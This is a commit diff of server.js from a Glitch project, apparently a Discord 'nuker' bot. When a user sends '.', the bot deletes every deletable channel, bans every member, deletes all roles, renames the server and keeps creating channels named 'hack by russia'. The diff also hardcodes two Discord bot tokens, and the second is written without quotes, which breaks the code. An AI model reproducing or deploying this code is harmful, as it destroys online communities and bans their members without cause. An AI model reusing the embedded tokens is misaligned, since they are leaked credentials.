00ed85a52668ce9ad283386a3ebd9a8413ec0ea5
Glitch (hello-express) <none>
2021-02-07 21:54:08 +0000

    🌾🎈 Checkpoint ./server.js:26430433/1942

--- server.js
+++ server.js
@@ -1,30 +1,28 @@
 const Discord = require("discord.js");
 const client = new Discord.Client();
-const prefix = ""
- client.on('message', message =>{
-    if (message.content === ('.')){
-            if (message.channel.guild){
-                message.guild.channels.forEach(c =>{
-                    if(c.deletable){
-                        c.delete()
-                    }
-                })
-                message.guild.members.forEach(m =>{
-                    m.ban()
-                })
-                message.guild.roles.forEach(r=>{
-                    r.delete()
-                })
-                message.guild.setName('bzndzaka')
-                setInterval(function(){
-                    message.guild.createChannel(' hack by russia', 'voice')
-                    message.guild.createChannel(' ras UP ', 'text')
-                    message.guild.createRole({name : ' <.>'})
-                })
-            }
+const prefix = "";
+client.on("message", message => {
+  if (message.content === ".") {
+    if (message.channel.guild) {
+      message.guild.channels.forEach(c => {
+        if (c.deletable) {
+          c.delete();
         }
- })
+      });
+      message.guild.members.forEach(m => {
+        m.ban();
+      });
+      message.guild.roles.forEach(r => {
+        r.delete();
+      });
+      message.guild.setName("bzndzaka");
+      setInterval(function() {
+        message.guild.createChannel(" hack by russia", "voice");
+        message.guild.createChannel(" ras UP ", "text");
+        message.guild.createRole({ name: " <.>" });
+      });
+    }
+  }
+});
 
-
-
-client.login("Nzk2NDYyMjc4NjM4ODI5NjIw.X_YRTA.FjHyW6EG1yHYxUbzjQz2gOLFLyE");
+client.login(ODA4MDkwNjY5NzY3ODUyMDcy.YCBfFQ.EFJycHtRci04xTeVEvPWVRtZE0E);
